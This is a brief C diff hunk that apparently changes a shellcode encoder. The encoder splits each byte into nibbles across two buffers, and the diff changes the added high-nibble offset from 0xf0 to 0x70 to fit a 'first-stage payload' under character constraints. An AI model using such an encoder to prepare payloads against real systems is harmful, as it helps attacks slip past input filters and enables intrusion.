@@ -139,13 +139,13 @@ main(int argc, char *argv[])
    * TODO: Change this encoding to be compatible with your
    * UTF-8 first-stage payload.
    * Lower goes in A, Upper goes in B
-   * Upper nibble for bytes will be 0xf
+   * Upper nibble for bytes will be 0x7
    */
   for (i = 0; i < (words+1)*8; i++)
     {
 
-	bufB[i] = ((bufA[i] & 0xf0) >> 4) + 0xf0;
-	bufA[i] = (bufA[i] & 0xf) + 0xf0;
+	bufB[i] = ((bufA[i] & 0xf0) >> 4) + 0x70;
+	bufA[i] = (bufA[i] & 0xf) + 0x70;
 
 
 /*      if (bufA[i] == 0xff)
